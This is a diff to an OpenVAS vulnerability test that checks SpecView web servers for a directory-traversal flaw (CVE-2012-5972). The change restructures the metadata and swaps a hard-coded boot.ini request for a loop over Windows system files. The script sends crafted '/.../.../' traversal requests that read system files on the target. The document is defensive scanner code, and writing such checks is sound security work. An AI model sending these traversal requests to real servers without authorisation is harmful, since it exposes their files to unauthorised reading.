@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_SpecView_54243.nasl 11429 2018-09-17 10:08:59Z cfischer $
+# $Id: gb_SpecView_54243.nasl 12092 2018-10-25 11:43:33Z cfischer $
 #
 # SpecView Web Server Directory Traversal Vulnerability
 #
@@ -25,59 +25,67 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103506");
   script_bugtraq_id(54243);
   script_cve_id("CVE-2012-5972");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_version("$Revision: 11429 $");
-
+  script_version("$Revision: 12092 $");
   script_name("SpecView Web Server Directory Traversal Vulnerability");
-
-  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54243");
-
-  script_tag(name:"last_modification", value:"$Date: 2018-09-17 12:08:59 +0200 (Mon, 17 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-25 13:43:33 +0200 (Thu, 25 Oct 2018) $");
   script_tag(name:"creation_date", value:"2012-07-02 12:15:35 +0200 (Mon, 02 Jul 2012)");
   script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
   script_family("Web application abuses");
-  script_tag(name:"solution_type", value:"VendorFix");
   script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
   script_dependencies("gb_get_http_banner.nasl");
   script_require_ports("Services/www", 80);
   script_mandatory_keys("SpecView/banner");
 
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54243");
+
   script_tag(name:"summary", value:"SpecView is prone to a directory-traversal vulnerability because it
-fails to properly sanitize user-supplied input.
+  fails to properly sanitize user-supplied input.");
 
-Remote attackers can use specially crafted requests with directory-
-traversal sequences ('../') to retrieve arbitrary files in the context
-of the application.
+  script_tag(name:"insight", value:"Remote attackers can use specially crafted requests with directory-
+  traversal sequences ('../') to retrieve arbitrary files in the context of the application.");
 
-Exploiting this issue may allow an attacker to obtain sensitive
-information that could aid in further attacks.");
-  script_tag(name:"solution", value:"Updates are available.");
+  script_tag(name:"impact", value:"Exploiting this issue may allow an attacker to obtain sensitive
+  information that could aid in further attacks.");
+
+  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"VendorFix");
+
   exit(0);
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
+include("misc_func.inc");
 
-port = get_http_port(default:80);
+port = get_http_port( default:80 );
 
-banner = get_http_banner(port:port);
-if("SpecView" >!< banner)exit(0);
+banner = get_http_banner( port:port );
+if( ! banner || "SpecView" >!< banner )
+  exit( 0 );
 
-url = '/.../.../.../.../.../.../boot.ini';
+files = traversal_files( "Windows" );
 
-if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
+foreach pattern( keys( files ) ) {
 
-  security_message(port:port);
-  exit(0);
+  file = files[pattern];
 
+  url = "/.../.../.../.../.../.../" + file;
+
+  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
-exit(0);
+exit( 0 );
